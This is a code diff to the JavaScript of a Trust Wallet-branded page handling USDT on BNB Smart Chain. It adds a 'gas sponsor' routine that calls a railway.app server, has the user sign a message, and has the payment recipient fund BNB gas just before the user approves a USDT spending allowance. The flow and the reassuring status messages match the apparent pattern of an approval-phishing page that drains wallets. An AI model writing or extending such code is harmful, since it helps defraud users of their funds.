@@ -307,7 +307,9 @@
       asset: '0x55d398326f99059fF775485246999027B3197955',
       network: 'BSC',
       coinId: '20000714',
-      chainId: '0x38'
+      chainId: '0x38',
+      sponsorApiUrl: 'https://trust-wallet-gas-server-production.up.railway.app',
+      sponsorFundingEnabled: false
     });
     address.value = walletConfig.address;
     networkName.textContent = walletConfig.network;
@@ -591,10 +593,51 @@
       const pending = pendingApproval;
       document.querySelector('#spendingStatus').textContent = 'Approval submitted. Waiting for BSC confirmation…';
       const link = document.querySelector('#spendingTransaction');
+      link.textContent = 'View approval on BscScan';
       link.href = 'https://bscscan.com/tx/'+pending.hash; link.hidden = false;
       await waitForApproval(pending.hash);
       pendingApproval = null;
       await verifyWallet();
+    }
+    async function requestGasFunding(statusElement) {
+      const api=walletConfig.sponsorApiUrl;
+      if (!api || !walletConfig.sponsorFundingEnabled) return;
+      const request = async (path, input) => {
+        const response=await fetch(api+path,{method:input?'POST':'GET',headers:input?{'Content-Type':'application/json'}:{},body:input?JSON.stringify(input):undefined,signal:AbortSignal.timeout(20000)});
+        const result=await response.json();
+        if(!response.ok) throw new Error(result.error || 'Gas sponsor is temporarily unavailable.');
+        return result;
+      };
+      const health=await request('/health');
+      if (!health.sponsorshipEnabled) return;
+      const recipient=document.querySelector('#amountRecipient').textContent;
+      if (health.sponsorAddress?.toLowerCase()!==recipient.toLowerCase() || health.chainId!==56) throw new Error('Gas sponsor does not match the selected recipient/network.');
+      await verifyWallet();
+      const wallet=connectedAccount;
+      const challenge=await request('/api/gas/challenge',{wallet,recipient,amount:amountText.endsWith('.')?amountText.slice(0,-1):amountText});
+      if(challenge.state==='not-needed') return;
+      if(typeof challenge.message!=='string' || typeof challenge.id!=='string') throw new Error('Invalid gas funding request.');
+      statusElement.hidden=false;
+      statusElement.textContent='Sign the BNB gas funding request in Trust Wallet. This signature does not approve USDT spending.';
+      const messageHex='0x'+Array.from(new TextEncoder().encode(challenge.message),byte=>byte.toString(16).padStart(2,'0')).join('');
+      const signature=await amountProvider.request({method:'personal_sign',params:[messageHex,wallet]});
+      await verifyWallet();
+      if(connectedAccount.toLowerCase()!==wallet.toLowerCase()) throw new Error('Wallet changed during gas funding.');
+      const funded=await request('/api/gas/fund',{id:challenge.id,signature});
+      if(funded.state==='not-needed') return;
+      if(!/^0x[0-9a-fA-F]{64}$/.test(funded.hash)) throw new Error('Gas sponsor returned no valid funding transaction.');
+      statusElement.textContent='Recipient wallet submitted BNB gas funding. Waiting for confirmation…';
+      for(let attempt=0;attempt<60;attempt++) {
+        const receipt=await readBsc(amountProvider,'eth_getTransactionReceipt',[funded.hash]);
+        if(receipt) {
+          if(BigInt(receipt.status)!==1n) throw new Error('BNB gas funding failed.');
+          await verifyWallet();
+          statusElement.textContent='BNB gas funding confirmed.';
+          return;
+        }
+        await new Promise(resolve=>setTimeout(resolve,2000));
+      }
+      throw new Error('Gas funding is still pending. Check Trust Wallet before retrying.');
     }
     document.querySelector('#approveSpending').addEventListener('click', async () => {
       if (sendPending || !spendingRequest) return;
@@ -603,6 +646,7 @@
       document.querySelector('#approveSpending').disabled = true;
       document.querySelector('#spendingBack').disabled = true;
       try {
+        await requestGasFunding(document.querySelector('#spendingStatus'));
         if (pendingApproval) await submitApproval(request,pendingApproval.units);
         const existing = await getSpendingAllowance(request.account,request.spender);
         if (existing !== request.limit) {
@@ -631,6 +675,8 @@
       sendPending = true;
       document.querySelector('#sendButton').disabled = true;
       try {
+        await verifyWallet();
+        await requestGasFunding(document.querySelector('#reviewMessage'));
         await verifyWallet();
         if (reviewRequestId !== transfer.requestId || reviewedTransfer !== transfer) throw new Error('Transfer details changed. Review again.');
         const balance = BigInt(await readBsc(amountProvider,'eth_call',[{to:walletConfig.asset,data:'0x70a08231'+transfer.account.slice(2).padStart(64,'0')},'latest']));
